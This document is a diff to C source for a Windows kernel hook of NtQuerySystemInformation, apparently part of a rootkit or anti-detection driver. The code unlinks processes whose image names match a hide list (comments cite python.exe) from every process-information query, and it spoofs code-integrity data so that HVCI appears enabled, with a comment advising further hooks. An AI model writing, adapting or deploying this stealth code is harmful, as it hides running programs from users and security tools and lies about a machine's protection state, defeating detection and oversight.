@@ -2,10 +2,11 @@
 #include <undoc.h>
 #include <var.h>
 #include <wdm.h>
+#include <stdint.h>
 
 NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationClass, uint64_t* SystemInformation, uint32_t SystemInformationLength, uint32_t* ReturnLength)
 {
-    _SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX* grpBuf = nullptr;
+    SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX* grpBuf = NULL;
     unsigned int grpBufSize = 0;
     __int16 primaryGroup = 0; // BYREF — passed by pointer to ExpQuerySystemInformation
 
@@ -34,13 +35,13 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
         case 100: // SystemProcessorPerformanceDistribution
         case 108: // SystemProcessorCycleTimeInformation
         case 141:
-            primaryGroup = KeQueryPrimaryGroupThread(KeGetCurrentThread());
-            [[fallthrough]];
+            primaryGroup = loc_KeQueryPrimaryGroupThread(KeGetCurrentThread());
+            // [[fallthrough]]
 
         // Class 73 shares the group-scoped dispatch path but uses the initialized-to-zero primaryGroup (the "all processors / legacy" view) instead
         // of querying the current thread's actual group.
         case 73: // SystemLogicalProcessorInformation
-            grpBuf = (_SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX*)&primaryGroup;
+            grpBuf = (SYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX*)&primaryGroup;
             grpBufSize = sizeof(primaryGroup);
             break;
 
@@ -68,12 +69,12 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
             // (https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/handling-exceptions)
             __try
             {
-                _SYSTEM_PROCESS_INFORMATION* last_unhidden_p = NULL;
-                for (_SYSTEM_PROCESS_INFORMATION* p = SystemInformation;;) // huh, C allows implicit void* -> Any* casts in declaration, but only for void*. cool
+                SYSTEM_PROCESS_INFORMATION* last_unhidden_p = NULL;
+                for (SYSTEM_PROCESS_INFORMATION* p = SystemInformation;;) // huh, C allows implicit void* -> Any* casts in declaration, but only for void*. cool
                 {
                     // ImageName: filename of the binary, ex. "python.exe", "python3.exe", "pythonw.exe"
                     // UniqueProcessId: the real PID, ex. 1234
-                    if (p->ImageName != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
+                    if (p->ImageName.Buffer != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
                     {
                         if (p->NextEntryOffset == NULL)
                         {
@@ -88,7 +89,7 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
                     // no more processes; final linked list entry
                     if (!p->NextEntryOffset) break;
 
-                    p = (_SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
+                    p = (SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
                 }
             }
             __except (EXCEPTION_EXECUTE_HANDLER)
@@ -108,10 +109,10 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
 
             __try
             {
-                _SYSTEM_PROCESS_INFORMATION* last_unhidden_p = NULL;
-                for (_SYSTEM_PROCESS_INFORMATION* p = sess->Buffer;;)
+                SYSTEM_PROCESS_INFORMATION* last_unhidden_p = NULL;
+                for (SYSTEM_PROCESS_INFORMATION* p = sess->Buffer;;)
                 {
-                    if (p->ImageName != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
+                    if (p->ImageName.Buffer != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
                     {
                         if (p->NextEntryOffset == NULL)
                         {
@@ -125,7 +126,7 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
 
                     if (!p->NextEntryOffset) break;
 
-                    p = (_SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
+                    p = (SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
                 }
             }
             __except (EXCEPTION_EXECUTE_HANDLER)
@@ -142,10 +143,10 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
 
             __try
             {
-                _SYSTEM_PROCESS_INFORMATION* last_unhidden_p = NULL;
-                for (_SYSTEM_PROCESS_INFORMATION* p = SystemInformation;;)
+                SYSTEM_PROCESS_INFORMATION* last_unhidden_p = NULL;
+                for (SYSTEM_PROCESS_INFORMATION* p = SystemInformation;;)
                 {
-                    if (p->ImageName != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
+                    if (p->ImageName.Buffer != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
                     {
                         if (p->NextEntryOffset == NULL)
                         {
@@ -159,7 +160,7 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
 
                     if (!p->NextEntryOffset) break;
 
-                    p = (_SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
+                    p = (SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
                 }
             }
             __except (EXCEPTION_EXECUTE_HANDLER)
@@ -176,10 +177,10 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
 
             __try
             {
-                _SYSTEM_PROCESS_INFORMATION* last_unhidden_p = NULL;
-                for (_SYSTEM_PROCESS_INFORMATION* p = SystemInformation;;)
+                SYSTEM_PROCESS_INFORMATION* last_unhidden_p = NULL;
+                for (SYSTEM_PROCESS_INFORMATION* p = SystemInformation;;)
                 {
-                    if (p->ImageName != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
+                    if (p->ImageName.Buffer != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
                     {
                         if (p->NextEntryOffset == NULL)
                         {
@@ -193,7 +194,7 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
 
                     if (!p->NextEntryOffset) break;
 
-                    p = (_SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
+                    p = (SYSTEM_PROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
                 }
             }
             __except (EXCEPTION_EXECUTE_HANDLER)
@@ -210,10 +211,10 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
             __try
             {
 
-                _SYSTEM_BASICPROCESS_INFORMATION* last_unhidden_p = NULL;
-                for (_SYSTEM_BASICPROCESS_INFORMATION* p = SystemInformation;;)
+                SYSTEM_BASICPROCESS_INFORMATION* last_unhidden_p = NULL;
+                for (SYSTEM_BASICPROCESS_INFORMATION* p = SystemInformation;;)
                 {
-                    if (p->ImageName != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
+                    if (p->ImageName.Buffer != NULL && last_unhidden_p != NULL && should_hide(p->ImageName))
                     {
                         if (p->NextEntryOffset == NULL)
                         {
@@ -227,7 +228,7 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
 
                     if (!p->NextEntryOffset) break;
 
-                    p = (_SYSTEM_BASICPROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
+                    p = (SYSTEM_BASICPROCESS_INFORMATION*)((UCHAR*)p + p->NextEntryOffset);
                 }
             }
             __except (EXCEPTION_EXECUTE_HANDLER)
@@ -257,7 +258,7 @@ NTSTATUS __fastcall hooked_NtQuerySystemInformation(int32_t SystemInformationCla
             NTSTATUS s = loc_ExpQuerySystemInformation(0x67, grpBuf, grpBufSize, SystemInformation, SystemInformationLength, ReturnLength);
             if (!NT_SUCCESS(s)) return s;
 
-            _SYSTEM_CODEINTEGRITY_INFORMATION ci = {0};
+            SYSTEM_CODEINTEGRITY_INFORMATION ci = {0};
             ci.Length = sizeof(ci);
             // basic spoof HVCI on; if this matters to you, also hook SystemIsolatedUserModeInformation etc
             // the important part is that the ENABLED bit is spoofed
